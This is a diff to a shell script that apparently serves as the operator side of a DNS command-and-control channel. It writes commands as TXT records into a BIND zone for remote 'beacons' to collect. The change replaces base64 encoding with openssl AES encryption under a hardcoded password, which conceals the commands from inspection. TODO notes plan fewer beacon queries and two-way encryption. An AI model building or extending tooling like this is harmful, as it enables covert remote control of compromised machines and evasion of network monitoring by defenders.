@@ -3,11 +3,16 @@
 # Takes script or user input and deploys it to the beacons
 # Author - Doshmajhan
 
+# TODO - Aggregate commands into one TXT record until the 255 character limit is reached.
+#        Find a way to reduce the number of queries the beacon will need to make
+#        Figure out how to notify beacons
+#        Write code to make two way encryption, maybe txt record for key?
 
 zone="/etc/bind/dosh.cloud"
 regzone="dosh.cloud"
 file=""
 serial=$(sed '3!d' $zone)
+pass="c2FuZHRvbWIK"
 
 ## Function to deploy pre-written script to beacons
 ##
@@ -25,7 +30,7 @@ deploy_file(){
     x=1
     while read LINE; do
         # Encode the command
-        LINE=$(echo $LINE | base64)
+        LINE=$(echo $LINE | openssl enc -aes-256-cbc -a -k $pass)
         echo "$x       IN  TXT \"$LINE\"" >> $zone
         let x=x+1
     done < "$file"
@@ -57,7 +62,8 @@ interactive(){
             # Update number of commands and add new command
             sed -i "11s/$last/$x/" $zone
             # Encode the command
-            input=$(echo $input | base64)
+            input=$(echo $input | openssl enc -aes-256-cbc -a -k $pass)
+            echo $input
             echo "$x       IN  TXT \"$input\"" >> $zone
             last=$x
             let x=x+1
